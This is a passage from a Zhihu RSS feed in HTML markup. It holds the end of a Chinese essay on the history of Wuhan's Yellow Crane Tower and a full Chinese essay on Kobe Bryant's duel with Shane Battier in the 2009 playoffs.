data-caption=\"在黄鹤楼公园抱冰堂给小学生讲武汉城市历史故事——摄影长江日报记者\" data-watermark=\"watermark\" data-original-src=\"v2-6356c5d4e99062bd7061a413deb64d89\" data-watermark-src=\"v2-fca28c035be709c8d8ebff85b7281fae\" data-private-watermark-src=\"v2-c7bc6e12574b2c5b25d921f2ba7475cd\"></p>\n<p>同治楼烧毁后，官方重建计划一再搁置。张之洞督鄂时期曾经说：假如（黄鹤楼）重建全部得用钢铁。当时他正在兴建汉阳钢铁厂。说归说，做归做，有没有钱是一回事，有没有心情是另一回事。城市建设，国计民生，古建筑复兴从来不在首位。 </p>\n<p>一百年间，没有黄鹤楼的武汉人怎么过？</p>\n<p>茶馆、酒楼、戏院，评书、大鼓、小曲、戏，《吕洞宾醉酒黄鹤楼》、《刘备醉走黄鹤楼》，戏剧故事，民间传说，真真假假不重要，图个乐而已。</p>\n<p>武汉人心里，黄鹤楼是一种荣耀，城市精神的寄托——尽管如此，和衣食住行的日常需要还是不一样的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6e4e92da97600f7590f8d2e3cd3f7be1_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1920\" data-size=\"normal\" data-caption=\"汉口民众乐园，建于1919年，中国三大娱乐场之一——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-6e4e92da97600f7590f8d2e3cd3f7be1\" data-watermark-src=\"v2-52c6156223f9ee6ae02dd9b0ee966d96\" data-private-watermark-src=\"v2-876b8e9f357aa76bd9daafcc02ea3e2b\"></p>\n<p>清光绪三十年（1904年），湖广总督端方（短期兼职）在空空荡荡的黄鹄矶上自作主张建造一幢二层平顶西式建筑，竖一个砖砌瞭望高塔，武汉三镇没人喜欢，除了他自己。</p>\n<p>光绪三十三年（1907年），张之洞在北京升任内阁大学士兼军机大臣，湖北部属集资在黄鹄矶山坡兴建楼阁，主楼三层重檐歇山顶，附楼攒尖顶加歇山顶，风格、气势和前代黄鹤楼截然不同，先名风度楼（如战国蔺相如之虚怀若谷），张之洞更名奥略楼（谋略深远之意）并题写楼名。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9feac2ed21abce891fd7fdabe65014d0_720w.jpg?rss\" data-rawwidth=\"1714\" data-rawheight=\"1224\" data-size=\"normal\" data-caption=\"黄鹤楼古遗址清末奥略楼，注释见正文——非常感谢武汉地方志专家学者我的老师赠送图片资料影印件！朋友就是朋友！\" data-watermark=\"watermark\" data-original-src=\"v2-9feac2ed21abce891fd7fdabe65014d0\" data-watermark-src=\"v2-c71ea8776008c5fe43eba546b7eb7f91\" data-private-watermark-src=\"v2-3aa266a2412bb2578326a1fcf418ef6a\"></p>\n<p>随着时间流逝，渐渐后世人以奥略楼替代黄鹤楼，多数人真不知道，少数人知道装不知道。“昨天在武昌黄鹤楼和几个朋友聚”，“明天约好一起过武昌游黄鹤楼”……武汉三镇世代相传的黄鹤楼情结在没有黄鹤楼的一百年时光里有意无意执拗地坚持着。</p>\n<p>万里长江第一桥1957年建成，上层走人走汽车电车，下层走火车连通京广铁路，汉阳桥头架在龟山，武昌桥头架在蛇山，“天堑变通途”，武汉人好高兴！当年哪里顾得上毁掉不毁掉黄鹤楼旧址。任何时代，观赏美学从来都败给实用主义哲学。数十年后，兴奋心情渐渐平静下来，蓦然回首，天造地设的大自然馈赠，蛇山山头“千尺危崖”黄鹄矶已经不见了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-263b54d97ce8861d77b18b0d6a515c9f_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"683\" data-size=\"normal\" data-caption=\"长江一桥武昌桥头，图中桥头堡站立的位置就是当年蛇山头黄鹄矶。假想古黄鹤楼所在就是图中桥头堡所在。在这座桥头堡底下临街水泥墙上刻有几个字：古黄鹤楼旧址。古黄鹤楼之所以为天下名楼，其中之重要原因就是离长江太近，居高临下的江上风景——摄影胡西雷。\" data-watermark=\"watermark\" data-original-src=\"v2-263b54d97ce8861d77b18b0d6a515c9f\" data-watermark-src=\"v2-42d7e278c0dc5c4704ca1198330645d8\" data-private-watermark-src=\"v2-d767c16c4b47bffbedacf966f20345a6\"></p>\n<p>很多人惋惜，以为黄鹄矶上的黄鹤楼毁掉了，后来才弄清楚毁掉的是奥略楼和纯阳楼。</p>\n<p>其实人们“惋惜”错了——建筑毁掉可以再生（黄鹤楼古往今来毁掉兴起数十次），自然界（例如山和水）的毁掉，“再生”“重兴”就很难了。</p>\n<p>“古黄鹤楼旧址”几个字，很不显眼地刻在长江一桥武昌桥头临江大道靠山壁的那根钢筋水泥桥墩壁上，走过路过的人如果注意到可能会停下来看看，其实也没看出来个什么。</p>\n<p><b>新建黄鹤楼</b></p>\n<p>1985年，新建黄鹤楼重临长江之畔，坐落蛇山山顶，距离黄鹤楼旧址面对长江后退1000米，楼高五层，中式风格，西式结构，金碧辉煌，朱彩灿烂，特别是灯光勾勒的夜晚。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c89fc001b6575e62c13c00976180abd1_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"黄鹤楼广场——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-c89fc001b6575e62c13c00976180abd1\" data-watermark-src=\"v2-568d738fd001616cfc79d4547beaa952\" data-private-watermark-src=\"v2-d04ba87842c0019dc3b4813d8ac12cc6\"></p>\n<p>古今相比较，遗憾是肯定的：地理位置变了，古人诗词里的黄鹤楼风景多纬度视角效果绝对不会再有；时代空间变了，古人绘画中的黄鹤楼木柱木梁木架构纯中国古典绝对不会再有。每逢节假日游人堆山填海的今天，古风悠然的古黄鹤楼意境存在心里最好。</p>\n<p>古今相比较，骄傲是肯定的：今天黄鹤楼公园（黄鹤楼风景区）沿袭唐代起始楼阁建筑传统，主建筑群周边园林相互烘托，山石、花木、池塘、流水、亭阁、台榭、雕塑（包括巨型青铜雕塑世纪钟）……顺蛇山山脉一路往东绵延数公里，建造规模恢弘壮丽超过历史任何时期。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a3a652eea85631859ec6e7c78c30aa25_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"因为长江经过武汉三镇的流向（从西南往东北），历代黄鹤楼面临长江，正面楼体朝西。登高对岸两江交汇，汉江入江口江水奔腾。新建黄鹤楼楼上扁额书“黄鹤楼”三个大字，一楼匾额“气吞云梦”，曾经古云梦泽浩浩汤汤，从汉江上游一直覆盖长江中游——“气吞云梦”，对远古时空的怀念——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-a3a652eea85631859ec6e7c78c30aa25\" data-watermark-src=\"v2-820d63a4817ec1586bc69023e8797940\" data-private-watermark-src=\"v2-e3229328e94aedd0daa5461867264fad\"></p>\n<p>（完）2021.8.19</p>\n<hr>\n<p>附武汉黄鹤楼内外景观图——摄影胡榴明：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9e18283917aa304016587c3c8e56e1eb_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"气吞云梦，意思我正文解释了。书写者：赵朴初，中国佛教协会会长。年轻人多数不知道他，我们那一代人对他很熟悉。他的书法很漂亮！去年十月去长沙，长沙贾谊故居几个大字也是他的墨宝——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-9e18283917aa304016587c3c8e56e1eb\" data-watermark-src=\"v2-3e6e68fc2b022f77a9897ee522233548\" data-private-watermark-src=\"v2-40e91a3bd8ed41aa333b68cd29e05fc9\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1c5fd0f6a2c007e126212a5b311a0e6a_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"黄鹤楼一楼大厅当代黄鹤楼模型。黑石板墙面刻唐·闫伯里《黄鹤楼记》。厅内立柱悬挂七米楹联——清代文人既民国书画家吴作人墨迹：“爽气西来，云雾扫开天地憾；大江东去，波涛洗尽古今愁！”——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-1c5fd0f6a2c007e126212a5b311a0e6a\" data-watermark-src=\"v2-c9f2d963655ed41053120520307507c8\" data-private-watermark-src=\"v2-fd9090e93815fac2874dd00276ed87e2\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2064cc7e5b69dd204c3c72bbe4aca4ce_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"照片拍了好几年，忘了是黄鹤楼第几层了，墙面汉白玉刻绘，玻璃罩子里可能是只银制香炉，木雕长椅也是工艺品——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2064cc7e5b69dd204c3c72bbe4aca4ce\" data-watermark-src=\"v2-73ccacc5134c34600c6e67788f35142b\" data-private-watermark-src=\"v2-91c7a319cab24a99573ac58e44c0a0e1\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2192198ab6946a51b78dbd34f0d43cd7_720w.jpg?rss\" data-rawwidth=\"768\" data-rawheight=\"1024\" data-size=\"normal\" data-caption=\"黄鹤楼公园世纪钟，建于2000年。图片上看不觉得什么，走近前看非常巨大。作为一个世纪之交的亲历者，站在那里，很感动——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2192198ab6946a51b78dbd34f0d43cd7\" data-watermark-src=\"v2-67c244b7e32027d87eaa5d32950d0517\" data-private-watermark-src=\"v2-8904cceb4b321d2c0cb37372ef802b29\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ef7b9f5e4c39c76f1d970f1ae6c3fa08_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"596\" data-size=\"normal\" data-caption=\"明末青绿山水画家仇英的画。特地从网上找来放在这里给喜欢的人看看。前年去年《黄鹤楼》一文写作，为了鉴别《汉江揽胜图》到底是不是仇英的作品，我花了一些时间。说明一点：要想成为一个好的历史文化散文作家，很多知识非得了解一点不可，不然写不出好文章——当然我也不能说我的文章写得好——网络图片\" data-watermark=\"watermark\" data-original-src=\"v2-ef7b9f5e4c39c76f1d970f1ae6c3fa08\" data-watermark-src=\"v2-ff64e7b1aa54f09b87889fb7b607f390\" data-private-watermark-src=\"v2-0f6d4c3f273da68eb909225dcce307df\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-af6eaeabc6ec0290a2f77fdcaf49c237_720w.jpg?rss\" data-rawwidth=\"725\" data-rawheight=\"493\" data-size=\"normal\" data-caption=\"前几年应黄鹤楼景区和长江日报邀请，和几位诗人朋友去黄鹤楼参加一个黄鹤楼诗画活动——摄影黄鹤楼公园\" data-watermark=\"watermark\" data-original-src=\"v2-af6eaeabc6ec0290a2f77fdcaf49c237\" data-watermark-src=\"v2-116412f291b5ec5b407076b62791428b\" data-private-watermark-src=\"v2-a06a9787307cca7caf57fe7264b9a017\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-dde5062dfd782ee06b71883d941e0b32_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"黄鹤楼公园新开放景区抱冰堂·张之洞纪念馆——湖广总督张之洞调任北京，湖北新军军官集资修此堂纪念。张之洞平时自称“抱冰老人”，取《吴越春秋》越王勾践“冬常抱冰、夏常握火”一句——堂馆建筑素雅简朴，山静寂，树丰茂——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-dde5062dfd782ee06b71883d941e0b32\" data-watermark-src=\"v2-bf780bbc4d1b399965090c10e6fd130b\" data-private-watermark-src=\"v2-187aa3a5ee22191e028386fc049fc42c\"></p>\n<p>先到这里吧，以后再补充。</p>\n<p>2021.8.19.3:53</p>\n<p><br></p>\n<p><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ye-li-ge-52?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">胡榴明</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/463692637/answer/2066224265?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">12 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/337570929?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去湖北武汉的「黄鹤楼」有哪些实用的攻略和好的建议？</a><br><a href=\"http://www.zhihu.com/question/64528631?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉户部巷附近有什么好吃的吗？</a><br>\n","link":"http://www.zhihu.com/question/463692637/answer/2066224265?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"记忆中，最体现科比特质的一场比赛","date":"2021-08-26 03:53:18","description":"\n<p>以前聊到过：</p>\n<p>我觉得，最体现科比个人特质的比赛，不是81分、三节62分、34分钟56分、四连50分之类。</p>\n<p>而是2009年西部半决赛湖人对火箭之战，第二场。</p>\n<hr>\n<p>皮尔斯曾经比较科比、麦蒂、卡特、甜瓜、勒布朗。</p>\n<p>麦蒂是小前锋身材里的组织后卫，投篮起跳点高到你盖不到，所以你总得琢磨别让他进入投篮位置。</p>\n<p>卡特是投篮起跳很快，同时第一步惊人，所以特别需要在意防守的尺寸。</p>\n<p>勒布朗壮而又快，而且一个肩膀就能卡到身位，而且左右手全能，不停的身体接触也让你疲倦。你可以尝试让他跳投。</p>\n<p>甜瓜是个独特的家伙，又壮，又能投，而且袭篮的步伐很好，而且在任何点都能投篮。这让他难以取舍。</p>\n<p>针对科比，皮尔斯没说某个单项。他说科比的可怕是：他会无休止地反复来搞你，从一切可能的角度，用一切可能的方式来搞你。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>巴图姆刚去开拓者时，麦克米兰教练简单告诫他：</p>\n<p>防麦蒂？防他强投；防勒布朗？限制他突破。</p>\n<p>防科比？“祝你好运。”</p>\n<hr>\n<p>2009年西部半决赛第一场，姚明的光荣之战。众所周知，在斯台普斯球馆，姚明面对湖人三塔包围，28分10篮板，最后带伤归来终结比赛。</p>\n<p>那场火箭的另一个隐藏英雄是巴蒂尔：科比得了32分，但用了31发投篮。</p>\n<p>其中对位巴蒂尔时，22投8中。</p>\n<p>巴蒂尔尽量将科比左手突破，陷入夹击陷阱，不让科比进罚球线，用遮脸防守干扰科比的视线，尽量让科比投长距离的跳投。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2d676250b3338aa2454acd1349bfb9d7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-2d676250b3338aa2454acd1349bfb9d7_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>我们都知道，巴蒂尔是个完美的头脑型防守专家。他的身体天赋不过中人之资。研究对手，解读对手的偏好。比赛中，他逼迫对手往协防陷阱里走，让对手投篮时面前总有只手在。在对手外围活动时阻断传球线路，逼迫对手到不舒服的地方接球。他的身体接触，是当对手到内线时才进行的。因此，他的打法总是很干净。在长达48分钟的比赛里，巴蒂尔是NBA最好的粘防者之一。他将防守当作一门科学来解剖。他基本不会犯错。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>于是来到第二场。</p>\n<hr>\n<p>开场第一球，科比右翼要位，巴蒂尔伸手阻绝球。</p>\n<p>奥多姆给球左侧鱼主席，鱼主席给左翼阿里扎，巴蒂尔侧头看着阿里扎。</p>\n<p>就在巴蒂尔侧头瞬间，科比突然启动，巴蒂尔慢了一步；姚明横移，挡科比突破路线，巴蒂尔跟随。</p>\n<p>但科比没想突破内线：一个小跳步接球，起手直接跳投。</p>\n<p>姚明的补位提前到了，巴蒂尔的跟防并无问题，甚至也手遮眼了。科比接球起跳时两脚尖还朝左。</p>\n<p>在极小的缝隙中，科比滞空调整，抬右脚维持平衡，出手：得手了。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-02c4d48f79cf7b73f0348e14bcc899e7_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic4.zhimg.com/v2-02c4d48f79cf7b73f0348e14bcc899e7_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-02c4d48f79cf7b73f0348e14bcc899e7_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>之后，是一模一样的右翼横移罚球线拿球：巴蒂尔这次跟到了科比的无球走，放科比走左手，预备他左手突破。</p>\n<p>科比坚持走右手，但没突。一个大幅度横移，直接跳投得手。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>湖人推反击，奥多姆给科比掩护，方便科比左手突破中路。</p>\n<p>然而科比直接变速，右手突破底线，一口气穿过巴蒂尔、慈世平和姚明，左手上篮。</p>\n<p>他这一下不等湖人落位，直接变速突破，巴蒂尔和慈世平都没想到，尤其慈世平转胯时，明显预备不足。</p>\n<p>姚明本来面向正面等加索尔要位，但他反应够快，横移、跳步、封盖，但差了一点。</p>\n<p>科比正面上篮用左手并不多，这一下的意思：</p>\n<p>加速突破时左肩更接近篮筐，左手上篮，能越过身后补来的姚明。</p>\n<p>这一下，进攻的时机、方向、角度选择和细节，都有了。一下将巴蒂尔、慈世平和姚明给串了。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2a209b4fffca966931bc8bd3fd3b3ee3_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic4.zhimg.com/v2-2a209b4fffca966931bc8bd3fd3b3ee3_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-2a209b4fffca966931bc8bd3fd3b3ee3_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>巴蒂尔放科比左手，科比这次左手突破一步，急停小跳步，迎着巴蒂尔遮眼强投。</p>\n<p>5投4中，独得8分，湖人16比8领先，打停火箭。</p>\n<p>即，这场比赛，是科比开场左右开弓，无球走、持球急停、持球右突、左突急停跳投。</p>\n<p>四种打法，一个人打晕了火箭。<br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bd93c257e68cb8f5b963378981c30297_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"874\" data-rawheight=\"546\" class=\"origin_image zh-lightbox-thumb\" width=\"874\" data-original=\"https://pic4.zhimg.com/v2-bd93c257e68cb8f5b963378981c30297_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>科比叫加索尔挡拆，左手突破。</p>\n<p>巴蒂尔和姚明的方略是：逼科比左手突破，然后夹击。</p>\n<p>科比这一下属于自投罗网，但他有预备了：收球起那一下，就是按着急停跳投的步子走的。</p>\n<p>比平时更高的起跳，更大的倾斜幅度（所以落地向左退了），更高的出手点。</p>\n<p>在姚明和巴蒂尔夹击之下，得手。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-ea21353f7b35e1bd8fe5a63030c00664_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic1.zhimg.com/v2-ea21353f7b35e1bd8fe5a63030c00664_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic1.zhimg.com/v2-ea21353f7b35e1bd8fe5a63030c00664_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>随后，追身投巴蒂尔一个遮眼三分球，湖人29比16领先，科比自己13分。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>火箭换了慈世平来防，科比叫个掩护，面对海耶斯，招牌的起跳后扭身后仰踢右腿保持平衡投篮，压哨得手，第一节39比25。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-09909923caffd1b202888ce097fedd77_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic4.zhimg.com/v2-09909923caffd1b202888ce097fedd77_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-09909923caffd1b202888ce097fedd77_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>第二节火箭打出32比15的高潮一度反超3分。</p>\n<p>半场结束前8秒，科比右翼接球，一个横摇牵住巴蒂尔重心，直接迎着巴蒂尔一个三分球。57平进入下半场。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>下半场，科比右翼接球，若有若无的摇球右腰，一个右试探步。</p>\n<p>立刻连交叉步，左手突破。</p>\n<p>这一下左→右→左的重心摇摆，巴蒂尔也被晃了一步；科比直扑罚球线，巴蒂尔转胯跟随，架左手想挡科比变线突破，重心下沉，科比已经急停跳投，出手点比平时高。巴蒂尔阻挡但慢了一步，犯规被打三分。</p>\n<p>巴蒂尔每一步防守都是对的，但就是没防住。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-67842197f7d6478bc943b37a732c89bd_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic2.zhimg.com/v2-67842197f7d6478bc943b37a732c89bd_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic2.zhimg.com/v2-67842197f7d6478bc943b37a732c89bd_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>科比左翼接球，连续胯下运球后低重心右手突破中路，急停起手中投。</p>\n<p>巴蒂尔放弃遮眼了，直接干扰投篮。</p>\n<p>而科比出手时，右手有稍微调整角度伸直手臂，以躲过巴蒂尔的追盖。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b166790e225149d2d648662f07d05471_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic2.zhimg.com/v2-b166790e225149d2d648662f07d05471_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic2.zhimg.com/v2-b166790e225149d2d648662f07d05471_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>之后是科比右侧运球，右手突底线，轻靠巴蒂尔后借力抛射，恰好没让海耶斯干扰到。</p>\n<p>慈世平之后闹事，被罚下。</p>\n<p>科比左腰横切，接传球后又是空中扭身中投。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>然后就是全场最精妙的一球。<br></p>\n<p>科比右翼面对巴蒂尔，转身假动作被识破。至此是巴蒂尔的完美防守。</p>\n<p>于是科比别扭地抛板，立刻连一个别扭的跨步起跳，自投自抢，在姚明头顶点中。姚明和加索尔卡位呢，跟过来时，慢了一步。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-7b6d27f8f089c172d66128d1daee75e9_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic2.zhimg.com/v2-7b6d27f8f089c172d66128d1daee75e9_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic2.zhimg.com/v2-7b6d27f8f089c172d66128d1daee75e9_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>巴蒂尔防科比这个战略，是萨姆·辛基拿了一堆数据分析跟他一起研究出来的。</p>\n<p>赛后，辛基看着科比27投16中40分的数据，说了句话：</p>\n<p>“<b>科比得了40分，这么说有点难为情……但巴蒂尔今晚的防守真的很好</b>。”</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>的确。<br></p>\n<p>巴蒂尔全场跟科比斗智斗勇。没哪次防守是撒汤漏水的。没哪次防守没跟到位。没哪次防守脑抽失误。</p>\n<p>大家说防守好一般都爱说，让对手work for his points，巴蒂尔的确给科比制造足够多麻烦了。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>这才是诡异的地方：</p>\n<p>巴蒂尔没犯错。</p>\n<p>但科比还是27投16中得了40分。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>2008年西部决赛，波波维奇和马刺投篮教练英格兰杰一起表达过类似的意思：</p>\n<p>“科比不算联盟最好的远投手——但是联盟最好的跳投手之一。”</p>\n<p>这话有点别扭，毕竟对许多人而言，远投准才是投篮好。</p>\n<p>但看科比无数次越过巴蒂尔的投篮就知道了。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>他的扭身右脚滞空投，自己曾在2014年描述过，他看《Discovery》，发现猎豹高速奔跑时，也会靠尾巴维持平衡。所以：</p>\n<p>“我能用右脚当尾巴，对吧？”<br></p>\n<p>他的这种能力，让他无需调整到投篮步伐，也能强行起手。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>更有趣的一点：</p>\n<p>大多数优秀投手，都需要稳定的姿势才能找到投篮感觉。多少优秀射手十几年如一日雕琢同一个投篮姿势。</p>\n<p>而科比对巴蒂尔这一场的策略很明白：他知道巴蒂尔逼他用高难度投篮，他知道巴蒂尔试图遮眼控手破坏他的节奏。</p>\n<p>实际上全场科比<b>几乎没连续用同一种姿势投</b>，不是所谓“趁手热连着来几发”。他也知道对付巴蒂尔这种聪明人，得连续变招。</p>\n<p>他变了许多招，用不同的投篮方式，用许多奇怪的微调，让巴蒂尔完美无缺的跟防，总是差那么一小步。<br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4ccee8be8b7d66d277bf68d5fb24d5b4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"620\" data-rawheight=\"853\" class=\"origin_image zh-lightbox-thumb\" width=\"620\" data-original=\"https://pic1.zhimg.com/v2-4ccee8be8b7d66d277bf68d5fb24d5b4_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>1992年总决赛滑翔机被乔丹打爆后心悦诚服，“我以为迈克尔有两千招，我错了，他有三千招。”<br></p>\n<p>科比这一场，也差不多。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>开场用无球走位和真假挡拆迅速拉开比分打停。下半场用连续高难度持球单挑得分。无球走、右突投、右手突、左突投、追身投、右突投、试探步反向突破突中路、连续变向右突投……等被夹到绝境里，一个抛板自己投。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>每次巴蒂尔跟上了，科比总还有一点小小的变招在等他：投篮出手高一点、投篮起手快一点、加一个小跳步、直接急停起手，诸如此类。</p>\n<p>把高难度失衡投篮当家常便饭。皮尔斯所谓“连环杀手”。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>所以麦克米兰对巴图姆说的：对位科比？“祝你好运。”</p>\n<p>许多时候，你做得完美无缺，让科比的每个投篮都不容易了——但科比还是投得中。</p>\n<p>实际上，他的优点（历史级的高难度投篮能力）和他的毛病（热血上头时的投篮选择），都在这里面：</p>\n<p><b>对别人而言不得不为之的高难度变招投篮，对他而言，就是平平淡淡的日常。</b><br><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhang-jia-wei?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">张佳玮</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a 